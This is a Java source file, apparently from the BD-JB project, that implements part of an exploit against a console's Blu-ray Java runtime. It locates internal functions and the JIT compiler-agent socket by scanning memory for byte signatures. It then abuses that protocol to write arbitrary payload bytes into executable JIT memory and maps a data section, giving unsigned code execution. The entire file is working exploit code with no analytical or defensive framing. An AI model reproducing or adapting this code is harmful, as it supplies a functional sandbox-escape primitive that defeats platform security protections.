/*
 * Copyright (C) 2021 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package com.bdjb;

import com.bdjb.api.API;
import com.bdjb.api.Buffer;
import com.bdjb.api.Int8;
import com.bdjb.api.Text;
import java.io.RandomAccessFile;

/**
 * JIT class that exploits a vulnerability in the runtime-compiler protocol to map payloads to
 * executable memory.
 */
public final class JIT {
  public static final int PROT_NONE = 0x0;
  public static final int PROT_READ = 0x1;
  public static final int PROT_WRITE = 0x2;
  public static final int PROT_EXEC = 0x4;

  public static final int MAP_SHARED = 0x1;
  public static final int MAP_PRIVATE = 0x2;
  public static final int MAP_FIXED = 0x10;
  public static final int MAP_ANONYMOUS = 0x1000;

  public static final long MAP_FAILED = -1;

  // We actually have 32MB of code memory, but reserve 8MB for Java JIT.
  public static final int MAX_CODE_SIZE = 24 * 1024 * 1024;
  public static final int PAGE_SIZE = 0x4000;
  public static final int ALIGNMENT = 0x100000;

  private static final int CHUNK_SIZE = 0x30;

  private static final int SCE_KERNEL_MODULE_INFO_SIZE = 0x160;

  private static final int COMPILER_AGENT_REQUEST_SIZE = 0x58;

  private static final byte ACK_MAGIC_NUMBER = (byte) 0xAA;

  private static final byte[] BUFFER_BLOB_CREATE_SEQ = {
    (byte) 0x89, (byte) 0xF8, (byte) 0x49, (byte) 0x8B, (byte) 0x0F
  };

  private static final byte[] COMPILER_AGENT_SENDER_THREAD_SEQ = {
    (byte) 0x4C, (byte) 0x8B, (byte) 0x70, (byte) 0x08, (byte) 0x41
  };

  private static final String SCE_KERNEL_GET_MODULE_INFO_SYMBOL = "sceKernelGetModuleInfo";
  private static final String MMAP_SYMBOL = "mmap";
  private static final String WRITE_SYMBOL = "write";
  private static final String READ_SYMBOL = "read";

  private static final int BDJ_MODULE_HANDLE = 0;

  private static JIT instance;

  private final API api;

  private long sceKernelGetModuleInfo;
  private long mmap;
  private long read;
  private long write;
  private long BufferBlob__create;

  private int compilerAgentSocket;

  private JIT() throws Exception {
    this.api = API.getInstance();
    this.init();
  }

  public static synchronized JIT getInstance() throws Exception {
    if (instance == null) {
      instance = new JIT();
    }
    return instance;
  }

  private void init() {
    initSymbols();
    initJitHelpers();
  }

  private void initSymbols() {
    sceKernelGetModuleInfo =
        api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SCE_KERNEL_GET_MODULE_INFO_SYMBOL);
    mmap = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, MMAP_SYMBOL);
    read = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, READ_SYMBOL);
    write = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, WRITE_SYMBOL);

    if (sceKernelGetModuleInfo == 0 || read == 0 || write == 0) {
      throw new InternalError("symbols not found");
    }
  }

  private void initJitHelpers() {
    Buffer modinfo = new Buffer(SCE_KERNEL_MODULE_INFO_SIZE);
    modinfo.fill((byte) 0);
    modinfo.putLong(0x00, SCE_KERNEL_MODULE_INFO_SIZE);
    if (api.call(sceKernelGetModuleInfo, BDJ_MODULE_HANDLE, modinfo.address()) != 0) {
      throw new InternalError("sceKernelGetModuleInfo failed");
    }

    long bdjBase = modinfo.getLong(0x108);
    int bdjSize = modinfo.getInt(0x110);

    int i = 0;
    while (i < bdjSize
        && api.memcmp(bdjBase + i, BUFFER_BLOB_CREATE_SEQ, BUFFER_BLOB_CREATE_SEQ.length) != 0) {
      i++;
    }
    if (i == bdjSize) {
      throw new InternalError("BufferBlob::create not found");
    }
    BufferBlob__create = bdjBase + i - 0x21;

    i = 0;
    while (i < bdjSize
        && api.memcmp(
                bdjBase + i,
                COMPILER_AGENT_SENDER_THREAD_SEQ,
                COMPILER_AGENT_SENDER_THREAD_SEQ.length)
            != 0) {
      i++;
    }
    if (i == bdjSize) {
      throw new InternalError("compiler agent socket not found");
    }
    long compilerAgentSocketOpcode = bdjBase + i - 0x10;
    compilerAgentSocket =
        api.read32(compilerAgentSocketOpcode + api.read32(compilerAgentSocketOpcode + 0x3) + 0x7);
  }

  private long align(long x, long align) {
    return (x + align - 1) & ~(align - 1);
  }

  public long jitMap(long size, long alignment) {
    if (size >= MAX_CODE_SIZE) {
      throw new IllegalArgumentException("size too big");
    }
    Text name = new Text("jit");
    long blob = api.call(BufferBlob__create, name.address(), size + 0x88 + alignment - 1);
    if (blob == 0) {
      throw new OutOfMemoryError("BufferBlob__create failed");
    }
    long code = blob + api.read32(blob + 0x20);
    return align(code, alignment);
  }

  public void jitCopy(long dest, byte[] src, long n) {
    long req = api.malloc(COMPILER_AGENT_REQUEST_SIZE);
    long resp = api.malloc(Int8.SIZE);

    for (long i = 0; i < n; i += CHUNK_SIZE) {
      byte[] chunk = new byte[CHUNK_SIZE];

      System.arraycopy(src, (int) i, chunk, 0, (int) Math.min(n - i, CHUNK_SIZE));

      api.memset(req, 0, COMPILER_AGENT_REQUEST_SIZE);
      api.memcpy(req + 0x00, chunk, Math.min(n - i, CHUNK_SIZE));
      api.write64(req + 0x38, dest + i - 0x28);
      api.call(write, compilerAgentSocket, req, COMPILER_AGENT_REQUEST_SIZE);

      api.write8(resp, (byte) 0);
      api.call(read, compilerAgentSocket, resp, Int8.SIZE);

      if (api.read8(resp) != ACK_MAGIC_NUMBER) {
        throw new AssertionError("wrong compiler response");
      }
    }

    api.free(resp);
    api.free(req);
  }

  public long mapPayload(String path, long dataSectionOffset) throws Exception {
    RandomAccessFile file = new RandomAccessFile(path, "r");

    if ((dataSectionOffset & (PAGE_SIZE - 1)) != 0) {
      throw new IllegalArgumentException("unaligned data section offset");
    }

    if (dataSectionOffset < 0 || dataSectionOffset > file.length()) {
      throw new IllegalArgumentException("invalid data section offset");
    }

    // Allocate JIT memory.
    long address = jitMap(file.length(), ALIGNMENT);

    byte[] chunk = new byte[CHUNK_SIZE];

    // Copy .text section.
    for (long i = 0; i < dataSectionOffset; i += CHUNK_SIZE) {
      api.memset(chunk, 0, CHUNK_SIZE);

      file.seek(i);
      int read = file.read(chunk, 0, (int) Math.min(dataSectionOffset - i, CHUNK_SIZE));

      jitCopy(address + i, chunk, read);
    }

    // Map the .data section as RW.
    if (api.call(
            mmap,
            address + dataSectionOffset,
            align(file.length() - dataSectionOffset, PAGE_SIZE),
            PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
            -1,
            0)
        == MAP_FAILED) {
      throw new InternalError("mmap failed");
    }

    // Copy .data section.
    for (long i = dataSectionOffset; i < file.length(); i += CHUNK_SIZE) {
      api.memset(chunk, 0, CHUNK_SIZE);

      file.seek(i);
      int read = file.read(chunk, 0, (int) Math.min(file.length() - i, CHUNK_SIZE));

      api.memcpy(address + i, chunk, read);
    }

    return address;
  }
}
